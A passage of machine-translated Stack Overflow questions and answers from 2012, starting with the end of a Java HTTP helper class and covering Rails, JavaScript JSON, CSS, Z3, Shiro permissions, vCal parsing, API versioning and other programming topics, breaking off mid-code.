        DefaultHttpClient client = new DefaultHttpClient(basicparams);
        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
        body = body.replaceAll("%20", " ");
        String[] parameters = body.split("&");
        for (int i = 0; i < parameters.length; i++) {
            String[] parameter = parameters[i].split("=");
            if (parameter.length >= 2) {
                nameValuePairs.add(new BasicNameValuePair(parameter[0],
                        parameter[1]));
            }
        }
        method.setEntity(new UrlEncodedFormEntity(nameValuePairs));

        HttpResponse res = client.execute(method);

        InputStream data = res.getEntity().getContent();
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();
        doc = db.parse(data);
    } catch (ClientProtocolException e) {
        // TODO Auto-generated catch block
        // e.printStackTrace();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (URISyntaxException e) {
        // TODO Auto-generated catch block
        // e.printStackTrace();
    } catch (ParserConfigurationException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (SAXException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    return doc;
}

public static String performRequestAsString(String url, String method,
        List<NameValuePair> params) {
    String value = null;

    try {

        if (method == "POST") {
            // request method is POST
            // defaultHttpClient
            DefaultHttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(url);
            httpPost.setEntity(new UrlEncodedFormEntity(params));

            String paramString = URLEncodedUtils.format(params, "utf-8");
            String sampleurl = url + "" + paramString;
            Log.e("Request_Url", "" + sampleurl);

            HttpResponse httpResponse = httpClient.execute(httpPost);
            HttpEntity httpEntity = httpResponse.getEntity();
            InputStream is = httpEntity.getContent();
            value = convertStreamToString(is);

        } else if (method == "GET") {
            // request method is GET
            DefaultHttpClient httpClient = new DefaultHttpClient();
            String paramString = URLEncodedUtils.format(params, "utf-8");
            url += "" + paramString;
            Log.e("Request_Url", "" + url);
            HttpGet httpGet = new HttpGet(url);

            HttpResponse httpResponse = httpClient.execute(httpGet);
            HttpEntity httpEntity = httpResponse.getEntity();
            InputStream is = httpEntity.getContent();
            value = convertStreamToString(is);
        }

    } catch (ClientProtocolException e) {
        // TODO Auto-generated catch block
        // e.printStackTrace();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    return value;
}

public static JSONObject makeJsonObjHttpRequest(String url, String method,
        List<NameValuePair> params) {

    InputStream is = null;
    JSONObject jObj = null;
    String json = "";
    // Making HTTP request
    try {

        // check for request method
        if (method == "POST") {
            // request method is POST
            // defaultHttpClient
            DefaultHttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(url);
            httpPost.setEntity(new UrlEncodedFormEntity(params));

            String paramString = URLEncodedUtils.format(params, "utf-8");
            String sampleurl = url + "" + paramString;
            Log.e("Request_Url", "" + sampleurl);

            HttpResponse httpResponse = httpClient.execute(httpPost);
            HttpEntity httpEntity = httpResponse.getEntity();
            is = httpEntity.getContent();

        } else if (method == "GET") {
            // request method is GET
            DefaultHttpClient httpClient = new DefaultHttpClient();
            String paramString = URLEncodedUtils.format(params, "utf-8");
            url += "" + paramString;
            Log.e("Request_Url", "" + url);
            HttpGet httpGet = new HttpGet(url);

            HttpResponse httpResponse = httpClient.execute(httpGet);
            HttpEntity httpEntity = httpResponse.getEntity();
            is = httpEntity.getContent();
        }

    } catch (UnsupportedEncodingException e) {
        e.printStackTrace();
    } catch (ClientProtocolException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }

    try {
        BufferedReader reader = new BufferedReader(new InputStreamReader(
                is, "iso-8859-1"), 8);
        StringBuilder sb = new StringBuilder();
        String line = null;
        while ((line = reader.readLine()) != null) {
            sb.append(line + "\n");
        }
        is.close();
        json = sb.toString();
    } catch (Exception e) {
        Log.e("Buffer Error", "Error converting result " + e.toString());
    }

    // try parse the string to a JSON object
    try {
        jObj = new JSONObject(json);
    } catch (JSONException e) {
        Log.e("JSON Parser", "Error parsing data " + e.toString());
    }

    // return JSON String
    return jObj;

}

public static JSONArray makeJsonArryHttpRequest(String url, String method,
        List<NameValuePair> params) {

    InputStream is = null;
    JSONArray jArray = null;
    String json = "";
    // Making HTTP request
    try {

        // check for request method
        if (method == "POST") {
            // request method is POST
            // defaultHttpClient

            DefaultHttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(url);
            httpPost.setEntity(new UrlEncodedFormEntity(params));

            String paramString = URLEncodedUtils.format(params, "utf-8");
            String sampleurl = url + "" + paramString;
            Log.e("Request_Url", "" + sampleurl);

            HttpResponse httpResponse = httpClient.execute(httpPost);
            HttpEntity httpEntity = httpResponse.getEntity();
            is = httpEntity.getContent();

        } else if (method == "GET") {
            // request method is GET
            DefaultHttpClient httpClient = new DefaultHttpClient();
            String paramString = URLEncodedUtils.format(params, "utf-8");
            url += "" + paramString;
            Log.e("Request_Url", "" + url);
            HttpGet httpGet = new HttpGet(url);

            HttpResponse httpResponse = httpClient.execute(httpGet);
            HttpEntity httpEntity = httpResponse.getEntity();
            is = httpEntity.getContent();
        }

    } catch (UnsupportedEncodingException e) {
        e.printStackTrace();
    } catch (ClientProtocolException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }

    try {
        BufferedReader reader = new BufferedReader(new InputStreamReader(
                is, "iso-8859-1"), 8);
        StringBuilder sb = new StringBuilder();
        String line = null;
        while ((line = reader.readLine()) != null) {
            sb.append(line + "\n");
        }
        is.close();
        json = sb.toString();
    } catch (Exception e) {
        Log.e("Buffer Error", "Error converting result " + e.toString());
    }

    // try parse the string to a JSON object
    try {
        jArray = new JSONArray(json);
    } catch (JSONException e) {
        Log.e("JSON Parser", "Error parsing data " + e.toString());
    }

    // return JSON String
    return jArray;

}

} 
```

# ruby-on-rails - Rails 3 - 设计用户 has_many 私有嵌套对象

> ID：11806615
> 
> 赞同：0
> 
> 时间：2012-08-04T06:54:42.683
> 
> 标签：ruby-on-rails, ruby-on-rails-3, devise, mongoid

我在这里得到了一个真正的挠头，我需要一些指导。当您希望设计用户拥有自己的嵌套对象，其他用户无法查看或访问时，您会怎么做？例如：用户 has_many 客户，其中 has_many 工作。我可以让用户身份验证工作，我可以让客户>工作嵌套单独工作。现在，我如何获得拥有_many 客户和拥有_many 工作的用户？

用设计解决这个问题的现代有效方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:38:57.843

由 devise 生成的 User 模型没有什么特别之处。您可以随意添加 has_many 客户。[此 railscast](http://railscasts.com/episodes/235-omniauth-part-1?view=asciicast)展示了如何将omniauth 与设计集成，其中包括更改用户模型。

# javascript - 将数据转成类似于JSON的字符串

> ID：11806617
> 
> 赞同：0
> 
> 时间：2012-08-04T06:55:01.077
> 
> 标签：javascript, html, optimization, local-storage

有没有更好的方法来实现下面的代码

```
<form id="myform" onsubmit="return saveUserData('firstname','lastname');" method="post"> 
```

```
function saveUserData() {
    createJSONString(arguments);
    return false;
}

function createJSONString(arguments) {
    var userDetails = "{";
    for (i = 0; i < arguments.length - 1; i++) {
        userDetails += '"' + arguments[i] + '":' + '"'     +document.getElementById(arguments[i]).value + '",';
    }
    userDetails += '"' + arguments[i] + '":' + '"' + document.getElementById(arguments[i]).value + "}";
    alert(userDetails);
} 
```

基本上，函数 saveUserData 是从表单提交按钮调用的。所以想法是将参数传递给函数并创建一个类似 JSON 的字符串，以便我可以将其存储在 Chrome 和 Firefox 的 localStorage 变量中。这个想法是不要让 OCP 失败，因为将来如果我们添加中间名，JavaScript 代码不需要更改，只有 HTML 会更改。有没有更好的方法来实现这一点？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T08:04:27.583

您可以使用 json.stringify 方法制作 JSON 字符串。使用 json 库，chrome 和 ff 已在此方法中构建。

[http://json.org/](http://json.org/)

首先，您必须为这样的数据创建 javascript 对象。

```
var data = { 
    name : 'blu..',
    age  : 19
};

JSON.stringify(data);

// result is => "{"name":"blu..","age":19}"

function createJSONString(arguments) {
    var obj = {};     
    for (i = 0; i < arguments.length - 1; i++) {
        obj[arguments[i]] = document.getElementById(arguments[i]).value;
    }

    return JSON.stringify(obj);
}; 
```

# javascript - 在数据库中存储可排序的项目订单

> ID：11806623
> 
> 赞同：0
> 
> 时间：2012-08-04T06:56:26.560
> 
> 标签：javascript, mongodb, jquery-ui, database-design, database

我正在尝试创建一个表单布局，允许用户按照他们想要的任何顺序放置表单。为此，我使用了 jQuery UI Sortable 插件，它允许我检索列表中每个 DOM 元素的“订单号”。问题是我想将此信息保存在数据库中，以便以后可以按照用户指定的顺序重新呈现表单。

目前，表格是根据提供的模型生成的。假设我有这样的模型：

```
var model = {
title : 'Goldfinger',
actor : 'Sean Connery', 
genre : 'Action'
} 
```

对于这个模型（我使用的是Mongodb），为各自的键值对生成了三个输入框，并按照标题->演员->流派的顺序显示。存储此模型中每个字段的排序顺序信息的最佳方式是什么？

我想出的唯一一件事是使用“位置”属性做嵌套对象。

```
var model = {
title : { value : Goldfinger, position : 0 },
actor : { value : Sean Connery, position : 2 },
genre : { value : Action, position: 1 }
} 
```

但这对我来说似乎很麻烦，并且使模式的构建和数据库中的后续查询都变得复杂。有人有其他建议吗？

# html - CSS3 工具提示 IE7 解决方法

> ID：11806625
> 
> 赞同：1
> 
> 时间：2012-08-04T06:56:55.653
> 
> 标签：html, css, tooltip

我有这个 CSS3 工具提示，它在 Chrome、FF、IE9/8 中运行良好，但在 IE7 中不起作用，我想知道是否有人可以帮助它在 IE7 中运行。

```
 /* ==================== TOOLTIP  ==================== */
/* --- base --- */
div.p_table a.tooltip
    {
    position: relative;
    text-decoration: none !important;
    }
div.p_table div.tooltip{
    background: url(../images/question.png) no-repeat top left;
    width:16px;
    height:16px;
    display: inline-block;
    padding: 0px !important;
    margin: 0px !important;
}

div.p_table a.tooltip:hover
    {
    color: #999999;
    text-decoration: none !important;
    }

div.p_table a.tooltip:hover:after, div.p_table a.tooltip:hover:before
    {
    display: block;
    }

/* --- tooltip container --- */
div.p_table a.tooltip:before
    {
    content: attr(rel);
    display: block;
    width: 140px;
    position: absolute;
    z-index: 1000;
    bottom: 150%;
    left: -10px;
    padding: 5px 10px 8px 10px;
    text-align: left;
    color: #ffffff;
    display: none;
    /* background */
    background: #404040; /* CSS2 */
    background: -moz-linear-gradient(top, #4e4e4e 0%, #404040 100%); /* FF3.6+ */
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#4e4e4e), color-stop(100%,#404040)); /* Chrome,Safari4+ */
    background: -webkit-linear-gradient(top, #4e4e4e 0%,#404040 100%); /* Chrome10+,Safari5.1+ */
    background: -o-linear-gradient(top, #4e4e4e 0%,#404040 100%); /* Opera 11.10+ */
    background: -ms-linear-gradient(top, #4e4e4e 0%,#404040 100%); /* IE10+ */
    background: linear-gradient(top, #4e4e4e 0%,#404040 100%); /* W3C */
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#4e4e4e', endColorstr='#404040',GradientType=0 ); /* IE6-9 */
    /* border-radius */
    -webkit-border-radius: 2px;
    -moz-border-radius: 2px;
    border-radius: 2px;
    /* box-shadow */
    -webkit-box-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
    -moz-box-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
    box-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
    /* text-shadow */
    text-shadow: 0px 1px 0px #292929;
    }

/* --- tooltip arrow --- */
div.p_table a.tooltip:after
    {
    content: "";
    display: block;
    width: 0;
    height: 0;
    position: absolute;
    z-index: 1000;
    bottom: 18px;
    left: -2px;
    border-left: 6px solid transparent;
    border-right: 6px solid transparent;
    border-top: 6px solid #404040;
    display: none;
    background: transparent;    
    } 
```

我已经在 jsfiddle 中发布了整个 CSS3/html5，看看是否有人可以帮助我 [http://jsfiddle.net/f7jMR/](http://jsfiddle.net/f7jMR/)

# z3 - （错误“策略失败：不支持运算符，在调用此策略之前应用简化器”）在 Z3

> ID：11806626
> 
> 赞同：3
> 
> 时间：2012-08-04T06:57:23.107
> 
> 标签：z3

我想消除表达式并使用 z3 将最终结果转换为 cnf，但是，有一个错误说“（错误”策略失败：不支持运算符，在调用此策略之前应用简化器“）”脚本中的问题是什么？

```
(set-option :produce-models true)
(declare-var t Real)
(declare-var tc Real)
(declare-var t1 Real)
(declare-var t1c Real)
(assert
   (and 
      (not (and (and (<= 0.0 t)(<= 0.0 t1))(= t1c 2.0)(= tc 1.0)))
      (not (and (and (<= 0.0 t)(<= 0.0 t1))(< 2.0 t1c)(= tc 1.0)))
      (not (and (and (and (<= 0.0 t)(<= 0.0 t1))(< 1.0 tc)) (= t1c 2.0)))
      (not (and (and (and (<= 0.0 t)(<= 0.0 t1))(< 1.0 tc)) (< 2.0 t1c)))
      (or (and (and (and (<= 0.0 t)(<= 0.0 t1))(<= 0.0 t1c))(<= 0.0 tc)(< tc 1.0))
          (and (and (and (<= 0.0 t) (<= 0.0 t1))(<= 0.0 t1c))(< 1.0 tc)(< t1c 2.0))
          (and (and (and (<= 0.0 t)(<= 0.0 t1))(< 1.0 tc)) (= t1c 2.0))
          (and (and (and (<= 0.0 t) (<= 0.0 t1))(<= 0.0 t1c))
               (= tc 1.0)
               (or (and (and (and (<= 0.0 t) (<= 0.0 t1))(<= 0.0 t1c))
                        (< t1c  2.0)
                        (= tc 1.0)
                     )
                   (and (and (<= 0.0 t)(<= 0.0 t1))(= t1c 2.0)(= tc 1.0))
                )
           )
        )
   )
)
(apply (then  ctx-solver-simplify propagate-values  (par-then (repeat (or-else split-clause skip)) propagate-ineqs) tseitin-cnf)) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T17:32:54.200

一些策略（例如`tseitin-cnf`）假设某些运算符（例如 , `and`, `distinct`...）已被淘汰。在您的示例中，问题是出现`and`嵌套在公式中的运算符。您可以使用该策略消除它`(! simplify :elim-and true)`。这是更新的脚本：

`(apply (then (! simplify :elim-and true) ctx-solver-simplify propagate-values (par-then (repeat (or-else split-clause skip)) propagate-ineqs) tseitin-cnf))`

话虽如此，在下一个版本中，我们将使诸如`tseitin-cnf`更“用户友好”之类的策略。也就是说，它会在需要时自动应用所需的转换。

# java - 根据对象的字段值定义访问级别

> ID：11806628
> 
> 赞同：2
> 
> 时间：2012-08-04T06:58:19.060
> 
> 标签：java, grails, spring-security, shiro

假设这个类（在 groovy 中）：

```
class Class_A {
    String type
    ...
} 
```

我想根据类型的值定义对其实例的访问级别。例如，如果类型值为“T1”，则某些用户将对 Class_A 具有读取访问权限，而如果类型值为“T2”，则其他用户对其具有读取访问权限。请不要提供基于继承的解决方案。我可以使用 spring-security 或 apache shiro 吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T19:26:26.077

据我所知，没有开箱即用的插件可以解决这个问题，但是我已经使用 shiro 实现了项目，这些项目确实限制了对对象的访问。

您的问题将分为两个单独的问题：

a) 限制对对象的直接访问 - 没有权限的用户不应该能够访问这些对象的显示页面

b) 过滤列表和搜索 - 没有正确权限的用户不应在概览列表和搜索结果中看到这些对象

* * *

我对a）的解决方案：

创建一个过滤器类（http://grails.org/doc/latest/guide/single.html#filters）并`before`为每个控制器添加一个过滤器，它能够显示要保护的对象。在此过滤器中，您可以预取对象并检查权限。如果它们不匹配，您可以重定向到拒绝访问页面。（当您在控制器中第二次请求对象时，Hibernate 似乎足够聪明，可以从缓存中获取对象）

顺便说一句：这样，您还可以实现其他隐式权限和角色（例如，仅当用户自己创建对象时才显示对象）

* * *

我对 b) 的解决方案：

在大多数项目中，您必须修改列表视图并添加搜索。那么为什么不简单地添加一个搜索条件作为对象的过滤器呢？如果您使用标准构建器，添加附加标准很容易......但您必须确保以正确的方式完成分页和排序。

希望有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-18T14:58:32.347

Apache Shiro 可以做到这一点，但它确实需要一些工作。

在我的解决方案中，我实现了一个经典的 RBAC 模型并提供了一个自定义 AuthorizingRealm 覆盖这些方法

```
protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principal)
protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) 
```

返回的 AuthorizationInfo 应该包含用户应该拥有的角色和权限。

```
SimpleAuthorizationInfo authInfo= new SimpleAuthorizationInfo( acl.getRoles() );
authInfo.addStringPermissions( acl.getPermissions() );
return authInfo; 
```

在 Shiro 中权限定义为：

```
domain:action:instance 
```

因此，在您的示例中，此字符串权限将允许对 Class_A 的 T1 实例进行编辑

```
Class_A:edit:T1 
```

您还可以允许“所有”操作或实例。

```
Class_A:*:T1  // allow all actions
      or
Class_A:edit:* // allow edit of all instances 
```

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T11:48:31.780

这可以完成工作吗：http: [//grails.org/plugin/spring-security-acl/](http://grails.org/plugin/spring-security-acl/)

# parsing - Vcal 日期解析问题

> ID：11806630
> 
> 赞同：0
> 
> 时间：2012-08-04T06:58:36.397
> 
> 标签：parsing, null, timezone, nsdateformatter, vcalendar

我有以下字符串作为输入：

```
BEGIN:VCALENDAR
VERSION:2.0
BEGIN:VEVENT
SUMMARY;CHARSET=utf-8:hello 
LOCATION;CHARSET=utf-8:loc 
DTSTART:20120704T053000Z
DTEND:20120704T073000Z
END:VEVENT
END:VCALENDAR 
```

我面临的问题是我正在使用的日期部分：

```
 NSRange end = [Result rangeOfString:@"T"];

            NSString *DT=[NSString stringWithFormat:@"%@%@",[Result substringToIndex:end.location],[Result substringFromIndex:end.location+1]];

            NSDateFormatter *formatter=[[NSDateFormatter alloc] init];
            [formatter setTimeZone:[NSTimeZone defaultTimeZone]];
            [formatter setDateFormat:@"yyyyMMddHHmmssZ"];

            NSDate *dt=[formatter dateFromString:DT];   

            myEvent.startDate=dt;
            [formatter release]; 
```

`dt`返回这里是 NULL ，我做错了什么？

更新代码：我更新代码如下，现在可以获取日期但需要问，我需要设置语言环境或时区吗？

```
 [NSTimeZone resetSystemTimeZone]; 
        NSLocale *enUSPOSIXLocale;
        NSDateFormatter *sRFC3339DateFormatter = [[NSDateFormatter alloc] init];     

        if( [Result characterAtIndex:[Result length]-2] == 'Z')
        {   
            NSLog(@"in 1");
            [sRFC3339DateFormatter setDateFormat:@"yyyyMMdd'T'HHmmss"];
         }
        else 
        {
            NSLog(@"in 2");
            [sRFC3339DateFormatter setDateFormat:@"yyyyMMdd'T'HHmmssZ"];
        }

        NSDate *date = [sRFC3339DateFormatter dateFromString:[Result substringToIndex:[Result length]-2]];

        myEvent.startDate=date; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T07:11:11.103

看看你的格式：

```
[formatter setDateFormat:@"yyyyMMddHHmmssZ"]; 
```

现在看一个示例字符串：

```
20120704T073000Z 
```

你错过了 T。我不知道它是否需要转义，所以你可能想要以下任何一个：

```
[formatter setDateFormat:@"yyyyMMddTHHmmssZ"];
[formatter setDateFormat:@"yyyyMMdd'T'HHmmssZ"]; 
```

请注意，`Z`末尾的意思是“UTC”——我不知道 iOS 是否会自动考虑到这一点，但这至少意味着将时区设置为默认时区会产生误导。我会将其设置为 UTC 或根本不设置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T10:42:38.757

@Jon 是的，你是对的，这是我为他们指定 Z 的全部内容不需要指定任何时区，格式化程序会处理它。

```
 NSDateFormatter *sRFC3339DateFormatter = [[NSDateFormatter alloc] init];     

        if([Result rangeOfString:@"Z"].location != NSNotFound)
        {   
            Result=[Result substringToIndex:[Result length]-2];
            [sRFC3339DateFormatter setTimeZone:[NSTimeZone timeZoneWithAbbreviation:@"GMT"]];
            [sRFC3339DateFormatter setDateFormat:@"yyyyMMdd'T'HHmmss"];
         }
        else 
        {

           [sRFC3339DateFormatter setDateFormat:@"yyyyMMdd'T'HHmmssZ"];
        }

        NSDate *date = [sRFC3339DateFormatter dateFromString:Result];

        myEvent.startDate=date;

        [sRFC3339DateFormatter release]; 
```

# api - 当您可以实现版本控制时，为什么开发人员如此重视发布 API？

> ID：11806636
> 
> 赞同：6
> 
> 时间：2012-08-04T06:59:44.863
> 
> 标签：api, architecture, versioning, asp.net-web-api

每当我听到关于发布第 1 版 API 的讨论时，总是伴随着这个普遍的想法：

> 我们还不能发布我们的 API，因为我们必须在第一时间把它做好。

[这是Vic Gundotra](https://plus.google.com/107117483540235115863/posts/EstNjiL2uon)最近的一个例子，但还有很多其他的例子，包括 Stackoverflow 本身，早在 API 发布前一天。

我不明白的是，为什么第一个版本必须如此“正确”？使用 API，您可以实现版本控制和良好的文档，如果您做得很好，这并不难，为什么对版本 1 API 如此珍贵？

从一个版本到另一个版本，因为它是版本化的，所以 API 可以在没有任何重大更改的情况下发生巨大变化，因为旧版本仍然受支持。我想知道为什么关于发布 API 的大问题..？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-04T07:17:46.407

> 从一个版本到另一个版本，因为它是版本化的，所以 API 可以在没有任何重大更改的情况下发生巨大变化，因为旧版本仍然受支持。

这意味着两件事：

*   维护一个 API 的多个版本。即使您只支持“最后 3 个版本”，这仍然是一个负担。特别是，如果您公开了稍后要*删除*的功能，则意味着您无法进行任何清理工作，这些清理工作将作为删除的一部分提供，直到 N 个更多版本出现和消失。考虑由于 API 的重大变化而可能对存储数据产生的任何影响——当它们被多个系统使用时迁移存储表示，并根据不同的发布计划进行更新，这真的很痛苦。（是的，实现和 API 之间是有区别的——但 API 的变化通常最终意味着整个堆栈的变化。）
*   最终激怒了很多开发者。即使你给出了很多警告，如果他们不得不进行重大的重写，人们*也会感到恼火，因为 1.0 版是垃圾，当 1.4 版发布时，1.0 版将被删除。*

正确设计 API 是一项棘手的工作。是的，在实用主义和完美主义之间需要取得平衡——但这并不像你想象的那么简单。

我还要指出，（比如说）一个有 10 个用户快速发布然后更改它的开源项目与像谷歌或微软这样为全球开发者社区这样做的公司之间存在相当大的维护差异。大公司的内部 API（你不能轻易修复整个代码库）和小公司的内部 API 之间甚至有很大的区别，你可以随时改变世界。

我对做出如此大的事情感到惊讶感到有些同情——但这表明你还没有经历过改变 API 可能意味着的痛苦。你可能同样感到惊讶——甚至更惊讶——一旦一个错误的决定浮出水面，做出根本性的改变是多么困难。

（免责声明：我为谷歌工作，但不在 G+ 领域。此答案中的观点是我自己的，不代表谷歌。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-04T07:08:29.933

我认为这有点难以回答。但是让我试试。你做你的编程，但你第一次做对了吗？

好吧，我的经验是，我从某种方法开始，并且确实在增长。测试为绿色后，我查看它，发现它不够好。我正在添加我试图“清理”它的其他方法。

现在，用于更大软件包的 API 根本不是那么“小”。而且我敢打赌，从一开始，您甚至都没有接近您认为“足够好”的东西。但是，如果您发布一个 API，您就必须使用它。你不会结交很多朋友破坏 APIS。因此，如果您对您的代码有些认真，您将支持不同的版本。

我建议看看 GTK 的历史。有 GTK 1.2.x 和 2 之后的东西。我们曾经根据 GTK 1.2 编写软件并且并不“高兴”，因为 2 与 1.2 不兼容。所以该软件仍然停留在 GTK 的 1.2.x 中......

所以不是通常的方法不是你仍然有一个旧的 API 在运行但它已经坏了。因此，程序员不太乐意很早就发布 API（恕我直言）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T07:22:46.100

您可能会要求提供可扩展的 API，例如：

APIclass::anAPIcall(Xclass Xparam, Yclass Yparam, void *userData, void *extensions);

.. 'extensions' 在 V1.0 中作为 Null 传递。

您可以与供应商达成一致，即在以后的版本中将不支持 V1.0 提供的功能（但将继续提供）。

# windows - Windows的ksh ide？

> ID：11806637
> 
> 赞同：3
> 
> 时间：2012-08-04T07:00:26.273
> 
> 标签：windows, linux, ksh

我正在寻找适用于 windows 7 的 linux shell 环境。是否有`.ksh`或任何在 windows 上运行的 shell 环境？cygwin 有点不同，例如我不能`vi test.txt`在 cygwin 中运行，我不知道为什么。

我想要的是我应该能够在 kornshell 中编写代码并通过双击 .ksh 文件来运行它。

有一个用于 Windows 的 linux shell 环境，称为 ADP shell，我在工作中使用它，但我无法在网上找到它。

有人可以帮我找到这个吗，我的新工作需要这个。

多谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-04-17T09:09:59.623

也许[MobaXterm](http://mobaxterm.mobatek.net/)它可能对你有用；）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:56:11.223

The default Cygwin installation does not install vi. Vi is available as vim in the Editors category of the Cygwin setup application.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T22:04:35.720

Ksh for Windows 是[UWIN的一部分](http://www2.research.att.com/~gsf/download/uwin/uwin.html)

但是，它不包含 IDE。不过会很好。

# unix - 在 MonoProject 中保存程序设置

> ID：11806642
> 
> 赞同：0
> 
> 时间：2012-08-04T07:01:20.917
> 
> 标签：unix, app-config, monodevelop

我刚开始使用 UNIX System 和 MonoDevelop。在我的 MonoProject 中，我希望有机会让用户保存一些参数（登录名、密码、URL 等）。我使用配置文件和下一个代码：

```
 <?xml version="1.0" encoding="utf-8"?>
<configuration>

    <appSettings>

        <add key="Login" value="MyLogin" />
        <add key="Password" value="MyPassword" />
        <add key="URL" value="MyURL" />            
    </appSettings>

</configuration> 
```

现在我想从此文件中获取登录信息并编写下一个代码：

```
string param = System.Configuration.ConfigurationManager.AppSettings.Get ("Login"); 
```

但是这段代码返回 NULL。你能帮我吗，我错了，我怎样才能从配置文件中获取参数？你能给我看一些例子吗？提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-15T15:50:17.263

你应该使用类似的东西：

```
string param = System.Configuration.ConfigurationManager.AppSettings["login"]; 
```

配置文件看起来不错。

# loops - Common Lisp：DO 的空变量列表

> ID：11806646
> 
> 赞同：0
> 
> 时间：2012-08-04T07:02:15.253
> 
> 标签：loops, lisp, common-lisp, sbcl

根据 HyperSpec，其页面`DO`（重点由我提供）：

> do 接受***任意***数量的迭代变量，这些变量绑定在迭代内并并行执行。

然而似乎`DO`不能接受一个空的变量列表，比如这里：

```
(do (())
    ((cond n) (end-result))
  (cond-1..
  (cond-2..)) 
```

`DO`不能接受空的 var 列表是真的吗？是否有一个原因？（我想总是有`LOOP`）。

我正在运行 SBCL。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-04T07:11:31.917

括号太多。这将是：

```
(do () (condition return-value) forms) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-04T20:21:07.067

的语法`DO`在 Common Lisp 标准中定义：

```
do ({var | (var [init-form [step-form]])}*)
  (end-test-form result-form*)
  declaration*
 {tag | statement}* 
```

[您可以使用Common Lisp Hyperspec](http://www.lispworks.com/documentation/HyperSpec/Front/X_Symbol.htm)查找任何符号并找到特殊运算符和宏的语法。

从语法中可以看出，Lisp 需要一个变量形式的列表。这些可以是变量或 var 列表、可选的初始化形式和可选的步骤形式。使用此语法，您可以将多个变量与`DO`.

您还可以看到，只有一个列表结合了最终测试和结果表单。

# slickgrid - Slickgrid minWidth 和 maxWidth 被忽略

> ID：11806651
> 
> 赞同：0
> 
> 时间：2012-08-04T07:03:09.157
> 
> 标签：slickgrid

Slickgrid 似乎忽略了[minWidth 和 maxWidth 属性](https://github.com/mleibman/SlickGrid/wiki/API-Reference)。我错过了什么吗？

请注意，在下面的 jsFiddle 中，其中一列的*宽度*为 300，这是可以接受的，而其他列的*minWidth*和*maxWidth*设置为 300 而没有任何影响。

[http://jsfiddle.net/ericjohannsen/ZSJEj/1/](http://jsfiddle.net/ericjohannsen/ZSJEj/1/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T19:51:54.680

minWidth 和 maxWidth 仅适用于列大小调整操作或列自动调整大小时。您仍然需要指定初始宽度。

更新：我在 SlickGrid 中添加了列宽限制。

# php - CI 中的控制器未加载模型

> ID：11806657
> 
> 赞同：0
> 
> 时间：2012-08-04T07:04:33.150
> 
> 标签：php, codeigniter

所以这是我的代码 -

**控制器**

```
public function addCategory() {
    if($this->session->userdata('logged_in') == TRUE) {
        $this->load->model("categories");
        echo $this->categories->addCategory();
    }
} 
```

**模型 -**

```
<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Categories extends CI_Model {

    // Retrieves all category names and id's
    function getCategories() {

    }

    // Add category to database. If there are errors returns message to AJAX controller
    function addCategory() {
        return "yeah";
        das
        $categoryName = $_POST['categoryName'];
        $parentCategory = $_POST["parentCategory"];
        $error = "";
        if(isset($categoryName) && isset($parentCategory) && $categoryName != "") {
            $query = $this->db->get_where("categories", array("name" => $categoryName));
            if($query->num_rows() > 0) {
                $error = "Category with that name already exists!";
            }
            else {
                $data = array(
                    'name' => $categoryName,
                    'parent' => $parentCategory
                );
                $this->db->insert('categories', $data);
            }
        }
        else {
            $error = "Category Name can't be empty.";
        }
        if($error != "") {
            return $error;
        }
        else {
            return "Success! Category has been added!";
        }
    }

} 
```

正如你所看到的，我特别添加了 return "yeah" 和 das，看看它是否有效，但它没有，它只是返回空白页而没有错误。此外，这是 AJAX 请求，如果我在控制器中添加模型内容，它工作得很好。

可能是什么问题呢？如果您需要任何其他信息，请通知我。

编辑：同样，Das 只是我尝试过的东西，也没有显示任何错误，这是我当前的模型代码，没有未使用的条目 -

```
// Add category to database. If there are errors returns message to AJAX controller
function addCategory() {
    $categoryName = $_POST['categoryName'];
    $parentCategory = $_POST["parentCategory"];
    $error = "";
    if(isset($categoryName) && isset($parentCategory) && $categoryName != "") {
        $query = $this->db->get_where("categories", array("name" => $categoryName));
        if($query->num_rows() > 0) {
